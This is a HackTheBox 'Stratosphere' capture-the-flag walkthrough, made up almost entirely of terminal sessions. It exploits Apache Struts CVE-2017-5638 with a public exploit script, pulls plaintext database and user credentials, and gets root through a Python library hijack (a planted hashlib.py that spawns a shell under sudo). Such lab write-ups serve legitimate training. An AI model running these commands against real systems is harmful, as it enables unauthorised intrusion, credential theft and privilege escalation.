---
title: "HackTheBox - Stratosphere"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

root@kali:~# searchsploit apache struts  
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------$  
Exploit Title | Path  
| (/usr/share/exploitdb/)  
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------  
[...]  
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution | exploits/linux/webapps/41570.py  
[...]

root@kali:~# searchsploit -m exploits/linux/webapps/41570.py  
Exploit: Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution  
URL: https://www.exploit-db.com/exploits/41570/  
Path: /usr/share/exploitdb/exploits/linux/webapps/41570.py  
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/41570.py

root@kali:~# python 41570.py http://10.10.10.64/Monitoring/example/Welcome.action id  
[*] CVE: 2017-5638 - Apache Struts2 S2-045  
[*] cmd: id

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

root@kali:~# python 41570.py http://10.10.10.64/Monitoring/example/Welcome.action "ls -alh"  
[*] CVE: 2017-5638 - Apache Struts2 S2-045  
[*] cmd: ls -alh

total 24K  
drwxr-xr-x 5 root root 4.0K Sep 2 17:06 .  
drwxr-xr-x 42 root root 4.0K Oct 3 2017 ..  
lrwxrwxrwx 1 root root 12 Sep 3 2017 conf -> /etc/tomcat8  
-rw-r--r-- 1 root root 68 Oct 2 2017 db_connect  
drwxr-xr-x 2 tomcat8 tomcat8 4.0K Sep 3 2017 lib  
lrwxrwxrwx 1 root root 17 Sep 3 2017 logs -> ../../log/tomcat8  
drwxr-xr-x 2 root root 4.0K Sep 2 17:06 policy  
drwxrwxr-x 4 tomcat8 tomcat8 4.0K Feb 10 2018 webapps  
lrwxrwxrwx 1 root root 19 Sep 3 2017 work -> ../../cache/tomcat8

root@kali:~# python 41570.py http://10.10.10.64/Monitoring/example/Welcome.action "cat db_connect"  
[*] CVE: 2017-5638 - Apache Struts2 S2-045  
[*] cmd: cat db_connect

[ssn]  
user=ssn_admin  
pass=AWs64@on*&

[users]  
user=admin  
pass=admin

root@kali:~# python 41570.py http://10.10.10.64/Monitoring/example/Welcome.action 'mysql --user=admin --password=admin -e "show databases;"'  
[*] CVE: 2017-5638 - Apache Struts2 S2-045  
[*] cmd: mysql --user=admin --password=admin -e "show databases;"

Database  
information_schema  
users

root@kali:~# python 41570.py http://10.10.10.64/Monitoring/example/Welcome.action 'mysql --user=admin --password=admin -e "use users; show tables;"'  
[*] CVE: 2017-5638 - Apache Struts2 S2-045  
[*] cmd: mysql --user=admin --password=admin -e "use users; show tables;"

Tables_in_users  
accounts

root@kali:~# python 41570.py http://10.10.10.64/Monitoring/example/Welcome.action 'mysql --user=admin --password=admin -e "use users; select * from users.accounts;"'  
[*] CVE: 2017-5638 - Apache Struts2 S2-045  
[*] cmd: mysql --user=admin --password=admin -e "use users; select * from users.accounts;"

fullName password username  
Richard F. Smith 9tc*rhKuG5TyXvUJOrE^5CK7k richard

root@kali:~# ssh richard@10.10.10.64  
The authenticity of host '10.10.10.64 (10.10.10.64)' can't be established.  
ECDSA key fingerprint is SHA256:tQZo8j1TeVASPxWyDgqJf8PaDZJV/+LeeBZnjueAW/E.  
Are you sure you want to continue connecting (yes/no)? yes  
Warning: Permanently added '10.10.10.64' (ECDSA) to the list of known hosts.  
richard@10.10.10.64's password:  
Linux stratosphere 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u2 (2018-02-21) x86_64

The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
Last login: Mon Sep 3 09:07:51 2018 from 10.10.15.86  
richard@stratosphere:~$ ls -alh  
total 56K  
drwxr-x--- 7 richard richard 4.0K Sep 3 08:57 .  
drwxr-xr-x 4 root root 4.0K Sep 19 2017 ..  
lrwxrwxrwx 1 root root 9 Feb 10 2018 .bash_history -> /dev/null  
-rw-r--r-- 1 richard richard 220 Sep 19 2017 .bash_logout  
-rw-r--r-- 1 richard richard 3.5K Sep 19 2017 .bashrc  
drwxr-xr-x 3 richard richard 4.0K Oct 18 2017 .cache  
drwxr-xr-x 3 richard richard 4.0K Oct 18 2017 .config  
drwxr-xr-x 2 richard richard 4.0K Sep 3 02:04 .nano  
-rw-r--r-- 1 richard richard 675 Sep 19 2017 .profile  
drwxrwxrwx 2 richard richard 4.0K Oct 18 2017 Desktop  
drwxr-xr-x 2 root root 4.0K Sep 3 05:56 __pycache__  
-rw-r--r-- 1 richard richard 11 Sep 3 09:08 hashlib.py  
-rw-r--r-- 1 root root 175 Sep 3 07:59 hashlib.pyc  
-rwxr-x--- 1 root richard 1.5K Mar 19 15:23 test.py  
-r-------- 1 richard richard 33 Feb 27 2018 user.txt  
richard@stratosphere:~$ cat user.txt  
e61##########################36b

richard@stratosphere:~$ sudo -l  
Matching Defaults entries for richard on stratosphere:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:  
(ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py  
richard@stratosphere:~$ cat test.py  
#!/usr/bin/python3  
import hashlib

def question():  
q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")  
md5 = hashlib.md5()  
md5.update(q1.encode())  
if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":  
print("Sorry, that's not right")  
return  
print("You got it!")  
q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")  
sha1 = hashlib.sha1()  
sha1.update(q2.encode())  
if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':  
print("Nope, that one didn't work...")  
return  
print("WOW, you're really good at this!")  
q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")  
md4 = hashlib.new('md4')  
md4.update(q3.encode())  
if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':  
print("Yeah, I don't think that's right.")  
return  
print("OK, OK! I get it. You know how to crack hashes...")  
q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")  
blake = hashlib.new('BLAKE2b512')  
blake.update(q4.encode())  
if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':  
print("You were so close! urg... sorry rules are rules.")  
return

import os  
os.system('/root/success.py')  
return

question()

richard@stratosphere:~$ echo "import pty; pty.spawn('/bin/sh')" > hashlib.py  
richard@stratosphere:~$ sudo /usr/bin/python /home/richard/test.py  
# id  
uid=0(root) gid=0(root) groups=0(root)  
# cat /root/root.txt  
d41##########################27e